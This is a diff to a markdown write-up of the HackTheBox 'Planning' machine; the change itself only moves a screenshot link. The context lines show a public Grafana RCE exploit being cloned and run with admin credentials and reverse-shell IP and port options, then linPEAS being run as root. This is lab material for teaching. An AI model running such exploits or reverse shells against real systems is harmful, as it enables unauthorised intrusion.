@@ -26,9 +26,9 @@ Git clone https://github.com/z3k0sec/CVE-2024-9264-RCE-Exploit
 
 The script is then executed and a listener is set up.
 Note: To run the script, you will have to install the requests module through pip (pip install requests), in a python virtual environment.
-![Image Alt](https://github.com/mfahdk/Writeups/blob/main/HackTheBox/Planning/Screenshots/image015.png)
 python3 poc.py --url http://grafana.planning.htb/ --username admin --password 0D5oT70Fq13EvB5r --reverse-ip 10.10.14.131 --reverse-port 1234
 
+![Image Alt](https://github.com/mfahdk/Writeups/blob/main/HackTheBox/Planning/Screenshots/image015.png)
   
 Upon gaining access to the system, we are root but this user doesn’t contain either of the flags, so linPEAS is ran to look for any sensitive information.
 ![Image Alt](https://github.com/mfahdk/Writeups/blob/main/HackTheBox/Planning/Screenshots/image017.png)
